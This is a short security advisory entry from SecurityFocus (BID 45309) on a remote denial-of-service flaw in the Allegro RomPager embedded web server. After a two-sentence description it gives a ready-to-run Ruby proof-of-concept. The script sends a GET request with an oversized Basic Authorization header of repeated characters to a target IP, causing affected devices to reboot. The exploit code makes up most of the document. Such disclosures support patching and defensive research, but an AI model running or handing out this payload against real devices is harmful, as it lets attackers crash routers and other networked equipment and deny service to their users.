source: http://www.securityfocus.com/bid/45309/info

Allegro RomPager is prone to a remote denial-of-service vulnerability.

Successfully exploiting this issue allows remote attackers to reboot affected devices, resulting in a denial-of-service condition. 

require 'net/https'

url = URI.parse("http://IP/")
data = nil
headers = {
	"Host" => "IP",
	"Authorization" => "Basic

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
}

res = Net::HTTP.start(url.host, url.port) do |http|
	http.use_ssl = false
	http.send_request("GET", url.path, data, headers)
end

puts res.body

